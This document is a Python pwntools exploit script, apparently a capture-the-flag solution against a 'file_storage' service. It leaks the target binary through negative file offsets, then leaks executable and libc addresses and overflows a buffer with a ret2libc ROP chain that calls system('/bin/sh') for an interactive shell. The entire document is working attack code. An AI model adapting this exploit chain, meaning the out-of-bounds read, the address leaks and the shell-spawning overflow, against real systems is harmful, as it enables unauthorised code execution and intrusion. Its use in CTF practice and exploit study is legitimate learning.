#!/usr/bin/python3

from pwn import *

###################################################
### Stage 1: Leak binary byte to rebuild binary ###
###################################################
def GetBinary():
	context.log_level = 'critical'
	with open("bin", "wb") as f:
		pass

	offset = -13920
	length = 0x100
	while True:
		p = remote("file_storage.pwnable.vn", 10000)

		payload = f'cat lorem {offset} {length}'.encode()
		p.sendlineafter(b'> ', payload)

		output = p.recv(length)
		print(payload.decode(), "-->", output)
		if output==b'Invalid offset and length parameters':
			exit(0)
		with open("bin", "ab") as f:
			f.write(output)

		offset+=length

#########################
### Stage 2: Ret2Libc ###
#########################
def GetShell():
	context.log_level = 'debug'
	context.arch = 'amd64'
	context.os = 'linux'
	libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so', checksec=False)
	if args.LOCAL:
		p = process("./bin")
	else:
		p = remote("file_storage.pwnable.vn", 10000)

	#############################
	### 2.1: Leak exe address ###
	#############################
	payload = f'cat lorem {-120} {8}'.encode()
	p.sendlineafter(b'> ', payload)

	exe_leak = u64(p.recv(8))
	exe_base = exe_leak - 0x7f0
	log.info("Exe base: " + hex(exe_base))

	##############################
	### 2.2: Leak libc address ###
	##############################
	main = exe_base + 0x1811
	puts_got = exe_base + 0x4688
	puts_plt = exe_base + 0x11e0
	pop_rdi = exe_base + 0x1ab3

	p.sendlineafter(b'> ', b'exit')
	payload = cyclic(cyclic_find('qaac'))
	payload += flat(
		pop_rdi, puts_got,
		puts_plt,
		main,
		)
	p.sendlineafter(b'service!', payload)

	p.recvuntil(b'Bye!\n')
	puts_addr = u64(p.recv(6) + b'\x00\x00')
	libc.address = puts_addr - libc.sym['puts']
	log.info("Puts address: " + hex(puts_addr))
	log.info("Libc base: " + hex(libc.address))

	######################
	### 2.3: Get shell ###
	######################
	ret = exe_base + 0x1810

	p.sendlineafter(b'> ', b'exit')
	payload = cyclic(cyclic_find('qaac'))
	payload += flat(
		ret,        # Stack alignment will give us shell, otherwise don't
		pop_rdi, next(libc.search(b'/bin/sh')),
		libc.sym['system'],
		)
	p.sendlineafter(b'service!', payload)

	p.interactive()

if __name__=='__main__':
	if args.STAGE1:
		GetBinary()
		exit(0)

	if args.STAGE2:
		GetShell()
		exit(0)